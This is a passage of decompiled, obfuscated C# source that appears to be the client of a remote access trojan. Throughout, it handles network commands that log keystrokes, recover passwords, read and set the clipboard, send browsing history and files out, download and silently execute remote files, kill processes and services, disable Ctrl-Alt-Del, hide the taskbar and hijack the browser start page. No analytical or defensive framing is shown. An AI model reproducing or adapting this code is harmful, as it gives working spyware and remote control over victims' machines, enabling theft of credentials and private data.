				streamWriter.Flush();
			}
			string text2 = null;
			try
			{
				while (tcpClient.Connected)
				{
					text2 = streamReader.ReadLine();
					if (Operators.CompareString(text2, (string)null, false) == 0)
					{
						QSWSDxTR122(1);
					}
					switch (Strings.Left(text2, 10))
					{
					case "/STOPDOWN/":
						try
						{
							Nxp1V0sL114();
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
						break;
					case "/ENCOREFL/":
						try
						{
							if (num2 != num5)
							{
								StringBuilder stringBuilder3 = new StringBuilder();
								StringBuilder stringBuilder4 = new StringBuilder();
								num2 = (short)(num2 + 1);
								array = new byte[num - 1 + 1];
								binaryReader.Read(array, 0, num);
								binaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
								stringBuilder3.Append("/PAKSSEND/");
								int num8 = array.Length - 1;
								for (int k = 0; k <= num8; k++)
								{
									stringBuilder4.Append(array.GetValue(k)!.ToString() + " ");
								}
								stringBuilder3.Append((object?)stringBuilder4);
								streamWriter.WriteLine((object?)stringBuilder3);
								streamWriter.Flush();
							}
							else if (num6 > 0L)
							{
								StringBuilder stringBuilder5 = new StringBuilder();
								StringBuilder stringBuilder6 = new StringBuilder();
								array = new byte[(int)(num6 - 1L) + 1];
								binaryReader.Read(array, 0, (int)num6);
								stringBuilder5.Append("/FINEDOWN/");
								int num9 = array.Length - 1;
								for (int l = 0; l <= num9; l++)
								{
									stringBuilder6.Append(array.GetValue(l)!.ToString() + " ");
								}
								stringBuilder5.Append((object?)stringBuilder6);
								streamWriter.WriteLine((object?)stringBuilder5);
								streamWriter.Flush();
								Nxp1V0sL114();
							}
							else
							{
								streamWriter.WriteLine("/FINEDOWN/");
								streamWriter.Flush();
								Nxp1V0sL114();
							}
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							try
							{
								Nxp1V0sL114();
								streamWriter.WriteLine("/ERROR/");
								streamWriter.Flush();
							}
							catch (Exception projectError4)
							{
								ProjectData.SetProjectError(projectError4);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
						break;
					case "/ERROR/":
						try
						{
							Nxp1V0sL114();
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					default:
						try
						{
							streamWriter.WriteLine("/ERROR/");
							streamWriter.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					case "/FINISHED/":
						tcpClient.Close();
						return;
					}
				}
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void YUAIr196()
	{
		string text = null;
		try
		{
			while (lZGjY83.Connected)
			{
				text = d1sQ486.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					QSWSDxTR122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/INFOPCPC/", false) == 0)
				{
					try
					{
						Thread thread = new Thread(FYFWx183);
						thread.Start();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(text2, "/LASTURLS/", false) == 0)
				{
					try
					{
						method_4();
						string text3 = method_4();
						FHvqx85.WriteLine("/LASTURLS/" + text3);
						FHvqx85.Flush();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					QSWSDxTR122(1);
					try
					{
						FHvqx85.WriteLine("/LASTURLS/");
						FHvqx85.Flush();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void qmplC197()
	{
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_018b: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d6: Unknown result type (might be due to invalid IL or missing references)
		string text = null;
		try
		{
			while (BJ1JM88.Connected)
			{
				text = streamReader_2.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					QSWSDxTR122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/SHOWMESG/", false) != 0)
				{
					continue;
				}
				WGAIZ47 = (MessageBoxIcon)0;
				dMwpf48 = (MessageBoxButtons)0;
				string_2 = null;
				string_3 = null;
				try
				{
					List<string> list = new List<string>();
					string[] array = text.Split(new char[1] { '*' });
					string[] array2 = array;
					foreach (string item in array2)
					{
						list.Add(item);
					}
					string_2 = list[1].ToString();
					string_3 = list[2].ToString();
					switch (list[4].ToString())
					{
					case "Q":
						WGAIZ47 = (MessageBoxIcon)32;
						break;
					case "W":
						WGAIZ47 = (MessageBoxIcon)48;
						break;
					case "I":
						WGAIZ47 = (MessageBoxIcon)64;
						break;
					case "E":
						WGAIZ47 = (MessageBoxIcon)16;
						break;
					}
					switch (list[3].ToString())
					{
					case "OK":
						dMwpf48 = (MessageBoxButtons)0;
						break;
					case "ARI":
						dMwpf48 = (MessageBoxButtons)2;
						break;
					case "YNC":
						dMwpf48 = (MessageBoxButtons)3;
						break;
					case "YN":
						dMwpf48 = (MessageBoxButtons)4;
						break;
					case "OC":
						dMwpf48 = (MessageBoxButtons)1;
						break;
					case "RC":
						dMwpf48 = (MessageBoxButtons)5;
						break;
					}
					Thread thread = new Thread(g0y87l63132);
					thread.Start();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void method_13()
	{
		string text = null;
		try
		{
			while (wgqVq93.Connected)
			{
				text = cqvBN96.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					QSWSDxTR122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/OPENCDCD/":
					try
					{
						Thread thread3 = new Thread(YPx1r185);
						thread3.Start(true);
					}
					catch (Exception projectError19)
					{
						ProjectData.SetProjectError(projectError19);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CLOSECDD/":
					try
					{
						Thread thread2 = new Thread(YPx1r185);
						thread2.Start(true);
					}
					catch (Exception projectError18)
					{
						ProjectData.SetProjectError(projectError18);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DESKH/":
					try
					{
						XsRst465125();
					}
					catch (Exception projectError17)
					{
						ProjectData.SetProjectError(projectError17);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DESKS/":
					try
					{
						oeqLbd04124();
					}
					catch (Exception projectError16)
					{
						ProjectData.SetProjectError(projectError16);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTH/":
					try
					{
						tJrSd1cQ127();
					}
					catch (Exception projectError15)
					{
						ProjectData.SetProjectError(projectError15);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTS/":
					try
					{
						V0L0tka4126();
					}
					catch (Exception projectError14)
					{
						ProjectData.SetProjectError(projectError14);
						ProjectData.ClearProjectError();
					}
					break;
				case "/HIDETASK/":
					try
					{
						TlWKYRYD128();
					}
					catch (Exception projectError13)
					{
						ProjectData.SetProjectError(projectError13);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SHOWTASK/":
					try
					{
						SSVaGqnb129();
					}
					catch (Exception projectError12)
					{
						ProjectData.SetProjectError(projectError12);
						ProjectData.ClearProjectError();
					}
					break;
				case "/FLIP/":
					try
					{
						kOi523r7DYBk45 dm2 = hWm1w3KbI0E346.aMeWvH7k9flM215();
						Kab8ayE3137(ref dm2);
						dm2.dmDisplayOrientation = QOjs467[2];
						qXWfFuuv139(dm2);
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
					}
					break;
				case "/UNFLIP/":
					try
					{
						kOi523r7DYBk45 dm = hWm1w3KbI0E346.aMeWvH7k9flM215();
						Kab8ayE3137(ref dm);
						dm.dmDisplayOrientation = QOjs467[0];
						qXWfFuuv139(dm);
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SWAPM/":
					try
					{
						SwapMouseButton(256L);
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
					break;
				case "/UNSWAPM/":
					try
					{
						SwapMouseButton(0L);
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CADD/":
					try
					{
						fnzp5Hb6140(enable: false);
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CADE/":
					try
					{
						fnzp5Hb6140(enable: true);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/TMOFF/":
					try
					{
						GClass0.SendMessage((IntPtr)65535, 274u, (IntPtr)61808, (IntPtr)2);
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/TMON/":
					try
					{
						GClass0.SendMessage((IntPtr)65535, 274u, (IntPtr)61808, (IntPtr)(-1));
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SCRSTART/":
					try
					{
						dDDjqm0w142(start: true);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SCRSTOP/":
					try
					{
						dDDjqm0w142(start: false);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SPEAKOUT/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(method_12);
						thread.Start(text);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError20)
		{
			ProjectData.SetProjectError(projectError20);
			ProjectData.ClearProjectError();
		}
	}

	private void mWLCl199()
	{
		string text = null;
		try
		{
			while (GmCMf98.Connected)
			{
				text = streamReader_3.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					QSWSDxTR122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/IEVER/":
					try
					{
						RegistryKey localMachine = Registry.LocalMachine;
						RegistryKey registryKey4 = localMachine.OpenSubKey("Software\\Microsoft\\Internet Explorer");
						string text3 = registryKey4.GetValue("Version")!.ToString();
						Z3myE100.WriteLine("/IEVERSIN/" + text3);
						Z3myE100.Flush();
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STRTPAGE/":
					try
					{
						RegistryKey currentUser3 = Registry.CurrentUser;
						RegistryKey registryKey3 = currentUser3.OpenSubKey("Software\\Microsoft\\Internet Explorer\\Main");
						string text2 = registryKey3.GetValue("Start Page")!.ToString();
						Z3myE100.WriteLine("/IESTARTP/" + text2);
						Z3myE100.Flush();
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CHANGETL/":
					text = Strings.Mid(text, 11, Strings.Len(text));
					try
					{
						RegistryKey currentUser2 = Registry.CurrentUser;
						RegistryKey registryKey2 = currentUser2.CreateSubKey("Software\\Microsoft\\Internet Explorer\\Main");
						registryKey2.SetValue("Window Title", text, RegistryValueKind.String);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CHANGEHP/":
					text = Strings.Mid(text, 11, Strings.Len(text));
					try
					{
						RegistryKey currentUser = Registry.CurrentUser;
						RegistryKey registryKey = currentUser.CreateSubKey("Software\\Microsoft\\Internet Explorer\\Main");
						registryKey.SetValue("Start Page", text);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/RUNSPAGE/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						if (!text.StartsWith("http://") | !text.StartsWith("https://"))
						{
							text = "http://" + text;
						}
						Process.Start(text);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					QSWSDxTR122(1);
					try
					{
						Z3myE100.WriteLine("/IESTARTP/");
						Z3myE100.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
	}

	private void OHOBt200()
	{
		string text = null;
		try
		{
			while (Z8NUR103.Connected)
			{
				text = Izrug106.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					QSWSDxTR122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/CLIPBOAR/", false) == 0)
				{
					try
					{
						I2TFX19 = null;
						Thread thread = new Thread(xi22Ra4T146);
						thread.SetApartmentState(ApartmentState.STA);
						thread.Start();
						thread.Join();
						NXDop105.WriteLine("/CLIPBOAR/" + I2TFX19);
						NXDop105.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(text2, "/SETCLIPB/", false) == 0)
				{
					try
					{
						I2TFX19 = Strings.Mid(text, 11, Strings.Len(text));
						I2TFX19 = I2TFX19.Replace("***", "\r\n");
						Thread thread2 = new Thread(Fmgr1tDn149);
						thread2.SetApartmentState(ApartmentState.STA);
						thread2.Start();
						thread2.Join();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					QSWSDxTR122(1);
					try
					{
						NXDop105.WriteLine("/CLIPBOAR/");
						NXDop105.Flush();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void nMwPH201()
	{
		string text = null;
		checked
		{
			try
			{
				while (VgtCN108.Connected)
				{
					text = wkqPR111.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						QSWSDxTR122(1);
					}
					string text2 = Strings.Left(text, 10);
					if (Operators.CompareString(text2, "/DLARUNVS/", false) == 0)
					{
						try
						{
							List<string> list = new List<string>();
							string[] array = Strings.Mid(text, 11, Strings.Len(text)).Split(new char[1] { '/' });
							string[] array2 = array;
							foreach (string item in array2)
							{
								list.Add(item);
							}
							int index = list.Count - 1;
							string text3 = Strings.Mid(text, 11, Strings.Len(text));
							((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Network().DownloadFile(text3, Environment.GetEnvironmentVariable("Temp") + "\\" + list[index].ToString(), (string)null, (string)null, false, 100000, true);
							QSWSDxTR122(1);
							Process.Start(Environment.GetEnvironmentVariable("Temp") + "\\" + list[index].ToString());
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					else
					{
						if (Operators.CompareString(text2, "/DLARUNHD/", false) != 0)
						{
							continue;
						}
						try
						{
							List<string> list2 = new List<string>();
							string[] array3 = Strings.Mid(text, 11, Strings.Len(text)).Split(new char[1] { '/' });
							string[] array4 = array3;
							foreach (string item2 in array4)
							{
								list2.Add(item2);
							}
							int index2 = list2.Count - 1;
							string text4 = Strings.Mid(text, 11, Strings.Len(text));
							((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Network().DownloadFile(text4, Environment.GetEnvironmentVariable("Temp") + "\\" + list2[index2].ToString(), (string)null, (string)null, false, 100000, true);
							QSWSDxTR122(1);
							Process process = new Process();
							process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
							process.StartInfo.FileName = Environment.GetEnvironmentVariable("Temp") + "\\" + list2[index2].ToString();
							process.Start();
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_14()
	{
		string text = null;
		try
		{
			while (CVAg9113.Connected)
			{
				text = wR99A116.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					QSWSDxTR122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/PRINTTXT/", false) == 0)
				{
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(BmBHuaap120);
						thread.Start(text);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Vi4ti203()
	{
		string text = null;
		checked
		{
			try
			{
				while (OD75s118.Connected)
				{
					text = DH7b9121.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						QSWSDxTR122(1);
					}
					switch (Strings.Left(text, 10))
					{
					case "/IPREVIEW/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Image val = null;
							Image val2 = null;
							try
							{
								val2 = Image.FromFile(text);
								string text3 = null;
								if (val2 != null)
								{
									double num = (double)val2.get_Size().Width / (double)val2.get_Size().Height;
									double num2 = (double)val2.get_Size().Height / (double)val2.get_Size().Width;
									val = ((val2.get_Size().Width <= val2.get_Size().Height) ? val2.GetThumbnailImage((int)Math.Round(200.0 / num2), 200, (GetThumbnailImageAbort)null, default(IntPtr)) : val2.GetThumbnailImage(200, (int)Math.Round(200.0 / num), (GetThumbnailImageAbort)null, default(IntPtr)));
									MemoryStream memoryStream = new MemoryStream();
									val.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
									memoryStream.Capacity = (int)memoryStream.Length;
									byte[] buffer = memoryStream.GetBuffer();
									text3 = Convert.ToBase64String(buffer);
									nHQkj120.WriteLine("/IPREVIEW/" + text3);
									nHQkj120.Flush();
									memoryStream.Dispose();
									memoryStream.Close();
									val2.Dispose();
								}
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
						break;
					case "/SEARCHSS/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							string text2 = text;
							if (Operators.CompareString(text2, "1", false) == 0)
							{
								g5jZH13 = true;
							}
							else if (Operators.CompareString(text2, "2", false) == 0)
							{
								g5jZH13 = false;
								nHQkj120.WriteLine("/SEARCHFL/SEARCHEND");
								nHQkj120.Flush();
							}
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						break;
					case "/LISTDRVS/":
						try
						{
							Thread thread3 = new Thread(aCNpk163);
							thread3.Start(nHQkj120);
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
						break;
					case "/SEARCHFL/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							diUEF63 = text.Split(new char[1] { '¦' });
							Thread thread2 = new Thread(method_0);
							thread2.Start(diUEF63[0]);
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					case "/DOWNFILE/":
					{
						Thread thread = new Thread(vNVWK171);
						thread.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					default:
						QSWSDxTR122(1);
						try
						{
							nHQkj120.WriteLine("/IPREVIEW/");
							nHQkj120.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					}
				}
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_15()
	{
		string text = null;
		try
		{
			while (k90ic123.Connected)
			{
				text = OPXt37KdAmJK126.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					QSWSDxTR122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/KEYSLOGG/":
					try
					{
						Thread thread3 = new Thread(method_10);
						thread3.Start(false);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/KEYSLOGR/":
					try
					{
						Thread thread2 = new Thread(method_10);
						thread2.Start(true);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/INSTALLK/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(FqOlL181);
						thread.Start(text);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					QSWSDxTR122(1);
					try
					{
						i4KNkjpRY3P0125.WriteLine("/KEYSLOGG/");
						i4KNkjpRY3P0125.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}

	private void rdq4U205()
	{
		string text = null;
		try
		{
			while (XkRQ7milvkkb128.Connected)
			{
				text = gU6d3neO8VWj131.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					QSWSDxTR122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/PSWRECOV/", false) == 0)
				{
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(RCfTjNug143);
						thread.Start(c7OghOFOOovJ130);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					QSWSDxTR122(1);
					try
					{
						YSiuIPzmWZK4160.WriteLine("/TRYPAAAA/");
						YSiuIPzmWZK4160.Flush();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void jS9iW206()
	{
		string text = null;
		try
		{
			while (x23HEvnWdEd0133.Connected)
			{
				text = kxaDy06G34RI136.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					QSWSDxTR122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/LISTPROC/", false) == 0)
				{
					try
					{
						Thread thread = new Thread(mH5UB161);
						thread.Start();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(text2, "/KILLPROC/", false) == 0)
				{
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread2 = new Thread(T0VWj189);
						thread2.Start(text);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					QSWSDxTR122(1);
					try
					{
						IDzJby4gh6F1135.WriteLine("/LISTPROC/");
						IDzJby4gh6F1135.Flush();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void h6Ye3207()
	{
		string text = null;
		try
		{
			while (WDKFAWJ4RRDd138.Connected)
			{
				text = fq56lMQjCZ8c141.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					QSWSDxTR122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/LISTSERV/":
					try
					{
						Thread thread6 = new Thread(X7uxv162);
						thread6.Start();
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread5 = new Thread(qWSXd172);
						thread5.Start(text + "¦STOP");
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STRTSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread4 = new Thread(qWSXd172);
						thread4.Start(text + "¦START");
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DSBLSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread3 = new Thread(qWSXd172);
						thread3.Start(text + "¦DISABLE");
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/MNULSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread2 = new Thread(qWSXd172);
						thread2.Start(text + "¦MANUAL");
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/AUTOSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(qWSXd172);
						thread.Start(text + "¦AUTO");
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					QSWSDxTR122(1);
					try
					{
						lfZViCUhx8HU140.WriteLine("/LISTSERV/");
						lfZViCUhx8HU140.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
	}

	private void DPzEv208()
	{
		string text = null;
		try
		{
			while (XNMeXlFxnPVY143.Connected)
			{
				text = streamReader_4.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					QSWSDxTR122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/REFRWIND/":
					try
					{
						Thread thread3 = new Thread(method_7);
						thread3.Start();
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CLSEWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById7 = Process.GetProcessById(Conversions.ToInteger(text));
						processById7.Kill();
						Thread thread2 = new Thread(method_7);
						thread2.Start();
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
					break;
				case "/HIDEWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById6 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById6.MainWindowHandle, 0);
						Thread thread = new Thread(method_7);
						thread.Start();
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/MINIWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById5 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById5.MainWindowHandle, 6);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/MAXIWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById4 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById4.MainWindowHandle, 3);
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/RSTRWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById3 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById3.MainWindowHandle, 9);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DFLTWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById2 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById2.MainWindowHandle, 10);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SHOWWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
